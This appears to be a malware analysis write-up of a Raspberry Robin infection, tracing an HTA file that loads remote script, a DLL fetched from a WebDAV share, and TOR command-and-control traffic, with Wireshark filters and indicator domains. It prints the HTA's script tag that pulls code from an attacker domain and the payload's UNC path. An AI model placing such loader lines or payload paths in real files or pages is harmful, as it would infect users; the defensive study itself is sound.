**Theme:** Windows-based malware infection chain using a malicious HTA file that retrieves and executes a DLL payload from a WebDAV share, followed by TOR-based C2 traffic.

---

###  Step 1: Download and Extract Investigation Files

Downloaded the following from the case study:

- `2024-11-14-Raspberry-Robin-infection-initial-traffic.saz.zip`
- `2024-11-14-Raspberry-Robin-infection-traffic.pcap.zip`
- `2024-11-14-Raspberry-Robin-malware-samples.zip`

Unzipped using password: `infected_20241114`

---

###  Artifacts:

- `.pcap` for full network capture
- `.saz` archive from Fiddler HTTP debugger
- Malware sample ZIP includes:
  - `bootstrap.hta` (malicious script)
  - Retrieved payload: `v.dll`

### Step 2: Analyze Initial Stage ‚Äì HTA File Launch

**Artifact:** `bootstrap.zip`  
**Contained file:** `bootstrap.hta`

This HTA file contains a script referencing an external domain:

```html
<script src="https://735dba63.bright-witted.skin/2fh0gj35ptlit"></script>
```

**Purpose:** To dynamically pull a large obfuscated payload that includes further malware logic.

**Screenshot: Malicious HTA Trigger**  
Clicking this file results in a **5.5 MB obfuscated script** download.

Traffic shows numerous **HTTPS GET requests** and a large **payload in response**.

### Step 3: Monitor Traffic via Fiddler (SAZ)

**Opened:** `2024-11-14-Raspberry-Robin-infection-initial-traffic.saz` in Fiddler
download fiddler for free from **Source:** [fiddler](https://www.telerik.com/download/fiddler/fiddler4)

üì∏ **Screenshot: Traffic to Malicious Domain**  
**Observed:**

- Initial **HTTPS GET** to:  
  `https://735dba63.bright-witted.skin/2fh0gj35ptlit`

- Server returns **5.5 MB of obfuscated script code**

- Followed by connections to a **WebDAV share**:  
  `\\2z.si@ssl\u\i\v.dll`

 **Downloaded DLL:** `v.dll` ‚Äî a PE file (Windows DLL)

---

### Step 4: Identify DLL File Properties

**File `v.dll`** was hosted on the WebDAV share and manually retrieved:

üì∏ **Screenshot: v.dll Retrieved via WebDAV**  
- **File Size:** 2.55 MB  
- **Version:** 2.8.8.0  
- **Location:** `\\2z.si@ssl\u\i\v.dll`

This DLL is **Raspberry Robin‚Äôs main loader** and runs after the HTA script executes and fetches the file.

---

###  Step 5: Network Traffic Analysis (Wireshark)

**Opened:** `2024-11-14-Raspberry-Robin-infection-traffic.pcap`

 **Wireshark Filters Used**

#### üîç Filter 1 ‚Äì HTA & WebDAV-Related Connections:
```wireshark
http.request or tls.handshake.type eq 1 or ip.addr eq 194.5.212.85
```
This filter helps identify the initial infection stage and payload delivery.

Captures connections made when the `bootstrap.hta` file is launched.

 **Post DLL TOR Traffic**  
- TLS 1.2 Client Hello traffic on port 9001 from infected host.
- **SNI values observed:**
  - `vfnbzcosotyp[.]com`
  - `hsphy52[.]com`
  - `sdeq3iozavf[.]com`

Indicates encrypted C2 communication via TOR after payload execution.

Confirms that the DLL is actively attempting to reach out to attacker infrastructure through anonymized channels.

 **Conclusion:**  
This activity confirms C2 beaconing and persistence behavior associated with Raspberry Robin.  
The usage of port 9001 and non-standard SNI domains is a strong IOC for TOR-based post-exploitation traffic.


#### üîç Filter 2 ‚Äì TOR C2 Communication (Post DLL Execution):
```wireshark
tcp.port == 9001 or tls.handshake.type eq 1
```
Highlights encrypted communications over port 9001, often used by Raspberry Robin to connect to TOR gateways after payload execution.

**HTA Launch and WebDAV Payload Fetch**  

- Shows TLS handshake to:
  - `735dba63.bright-witted.skin` ‚Üí used in `bootstrap.hta`
  - `zz.si` ‚Üí hosting DLL via UNC path `\\2z.si@ssl\u\i\`

This confirms the initial GET request to fetch a large obfuscated payload (~5.5MB) from `bright-witted.skin`.

Followed by connection to `zz.si`, which is the WebDAV share used to deliver the DLL named `v.dll`.

 **Conclusion:**  
The screenshot proves that `bootstrap.hta` initiates the infection by downloading and executing scripts  
that result in DLL retrieval from WebDAV shares.

###  Step 6: Behavioral Summary

| **Phase**           | **Observed Activity**                                                                 |
|---------------------|----------------------------------------------------------------------------------------|
| **Initial Access**  | Victim extracts HTA from zip and double-clicks it                                     |
| **Execution**       | HTA runs embedded JavaScript ‚Üí downloads obfuscated script                            |
| **Delivery**        | Obfuscated script fetches DLL from WebDAV share                                       |
| **Persistence**     | DLL runs and likely installs persistence via registry/task                            |
| **C2 Communication**| Outbound TOR traffic on 9001 to multiple onion proxy domains                          |
| **Defense Evasion** | Obfuscation and encrypted comms (TLS and TOR)                                         |
